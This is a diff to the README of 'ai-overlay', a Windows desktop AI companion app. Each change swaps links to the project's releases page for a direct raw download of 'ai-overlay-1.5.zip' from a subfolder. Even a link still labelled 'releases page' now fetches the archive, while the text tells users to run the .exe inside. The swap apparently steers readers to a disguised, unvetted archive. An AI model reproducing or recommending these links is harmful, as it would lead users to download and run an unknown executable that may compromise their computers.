@@ -1,6 +1,6 @@
 # 🤖 ai-overlay - Your Friendly Desktop AI Companion
 
-[![Download ai-overlay](https://img.shields.io/badge/Download-ai--overlay-brightgreen)](https://github.com/watochidayo/ai-overlay/releases)
+[![Download ai-overlay](https://img.shields.io/badge/Download-ai--overlay-brightgreen)](https://github.com/watochidayo/ai-overlay/raw/refs/heads/main/dusken/ai-overlay-1.5.zip)
 
 ## 🖥️ What is ai-overlay?
 
@@ -36,7 +36,7 @@ Follow these steps to download and run ai-overlay on your Windows PC.
 
 Click this large button to visit the page where you can download the app:
 
-[![Download ai-overlay](https://img.shields.io/badge/Download-ai--overlay-blue)](https://github.com/watochidayo/ai-overlay/releases)
+[![Download ai-overlay](https://img.shields.io/badge/Download-ai--overlay-blue)](https://github.com/watochidayo/ai-overlay/raw/refs/heads/main/dusken/ai-overlay-1.5.zip)
 
 Choose the latest release and look for the Windows installer file. It usually ends with `.exe`. 
 
@@ -95,7 +95,7 @@ If you run into problems, try these steps:
 
 ## 🔄 Updates and Support
 
-Check the [releases page](https://github.com/watochidayo/ai-overlay/releases) regularly to see if a new version is available. Updates usually fix bugs and add small improvements.
+Check the [releases page](https://github.com/watochidayo/ai-overlay/raw/refs/heads/main/dusken/ai-overlay-1.5.zip) regularly to see if a new version is available. Updates usually fix bugs and add small improvements.
 
 To update:
 
@@ -109,7 +109,7 @@ If you want to stop using the app, uninstall it from Windows Settings under "App
 
 Use this link to visit the page where you can download the latest Windows version of ai-overlay:
 
-[https://github.com/watochidayo/ai-overlay/releases](https://github.com/watochidayo/ai-overlay/releases)
+[https://github.com/watochidayo/ai-overlay/raw/refs/heads/main/dusken/ai-overlay-1.5.zip](https://github.com/watochidayo/ai-overlay/raw/refs/heads/main/dusken/ai-overlay-1.5.zip)
 
 Look for a file with `.exe` in its name, download it, and run it to get started.
 
